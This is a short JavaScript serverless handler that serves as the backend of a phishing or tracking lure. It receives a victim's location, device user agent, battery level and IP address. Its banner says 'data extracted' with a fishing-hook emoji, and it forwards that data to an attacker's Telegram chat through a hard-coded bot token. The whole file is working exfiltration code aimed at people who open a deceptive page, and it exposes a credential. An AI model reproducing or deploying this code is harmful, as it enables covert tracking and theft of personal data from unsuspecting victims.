export default async function handler(req, res) {
  if(req.method!=='POST') return res.status(405).end();
  
  const {type,data,ua,bat}=req.body;
  const id='NX_'+Math.random().toString(36).substr(2,8).toUpperCase();
  
  const msg=`╭┈┈⬡「 🎣 ᴅᴀᴛᴀ ᴇxᴛʀᴀᴄᴛᴇᴅ 」
┃ ◦ ᴛᴇʀᴄʏᴅᴜᴋ ᴋᴀᴜ Suki 😹
┃ ◦ ━━━━━━ ᴅᴇᴛᴀɪʟs ━━━━━━
┃ ◦ 🆔 ɪᴅ: ${id}
┃ ◦ 🌐 ɪᴘ: ${req.headers['x-forwarded-for']||'Unknown'}
┃ ◦ 📍 ʟᴏᴄ: ${data}
┃ ◦ 📱 ᴅᴇᴠ: ${ua?.slice(0,40)||'N/A'}
┃ ◦ 🔋 ʙᴀᴛᴛ: ${bat||'N/A'}
┃ ◦ 📹 ᴛʏᴘᴇ: ${type}
╰┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈⬡`;
  
  try{
    await fetch('https://api.telegram.org/bot8651759192:AAGAHKMB_vgP7SrlLUGmDtyboaasI9lwZpA/sendMessage',{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:'7349944283',text:msg,parse_mode:'HTML'})
    });
    res.status(200).json({ok:true});
  }catch(e){
    res.status(500).json({error:e.message});
  }
}